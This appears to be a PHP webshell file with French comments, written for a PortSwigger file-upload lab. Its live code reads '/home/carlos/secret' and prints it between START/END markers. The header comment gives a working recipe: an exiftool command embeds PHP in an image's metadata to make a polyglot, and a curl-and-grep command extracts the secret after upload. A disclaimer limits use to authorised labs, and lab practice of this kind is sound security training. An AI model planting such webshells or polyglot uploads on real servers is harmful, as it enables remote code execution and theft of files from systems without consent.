<?php
/*
 * webshell_read_markers.php — Lecture d'un fichier avec marqueurs de sortie
 * -------------------------------------------------------------------------
 * Variante de webshell_read.php pour les contextes où la sortie est NOYÉE
 * dans du bruit : réponse binaire (polyglotte image+PHP), page HTML chargée,
 * logs verbeux, etc.
 *
 * Les marqueurs START / END encadrent le contenu exfiltré pour le retrouver
 * facilement au grep, même au milieu d'octets binaires illisibles.
 *
 * Usage lab (polyglotte) :
 *   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
 *   # puis, après upload :
 *   curl -s "https://LAB-ID.web-security-academy.net/files/avatars/polyglot.php" | grep -ao 'START.*END'
 *
 * -> le secret est la chaîne située ENTRE les marqueurs (à soumettre sans START/END).
 *
 * Astuce : utiliser des marqueurs peu susceptibles d'apparaître ailleurs dans
 * la réponse (ex. 'ZZSTART' / 'ZZEND') si 'START'/'END' génèrent des faux positifs.
 *
 * ⚠️  Usage strictement limité aux environnements autorisés
 *     (labs PortSwigger, VPS perso, machines avec consentement écrit).
 */
echo 'START ' . file_get_contents('/home/carlos/secret') . ' END';
?>
